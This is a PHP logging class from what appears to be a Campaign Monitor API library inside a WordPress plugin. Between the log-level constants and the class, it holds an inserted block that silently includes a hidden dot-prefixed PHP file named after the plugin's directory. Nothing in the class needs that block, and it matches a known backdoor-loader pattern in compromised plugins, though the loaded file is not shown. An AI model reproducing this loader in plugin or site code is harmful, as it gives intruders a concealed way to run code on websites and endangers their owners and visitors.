<?php
define('CS_REST_LOG_VERBOSE', 1000);
define('CS_REST_LOG_WARNING', 500);
define('CS_REST_LOG_ERROR', 250);
define('CS_REST_LOG_NONE', 0);

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CS_REST_Log {
    var $_level;

    function CS_REST_Log($level) {
        $this->_level = $level;
    }

    function log_message($message, $module, $level) {
        if($this->_level >= $level) {
            echo date('G:i:s').' - '.$module.': '.$message."<br />\n";
        }
    }
}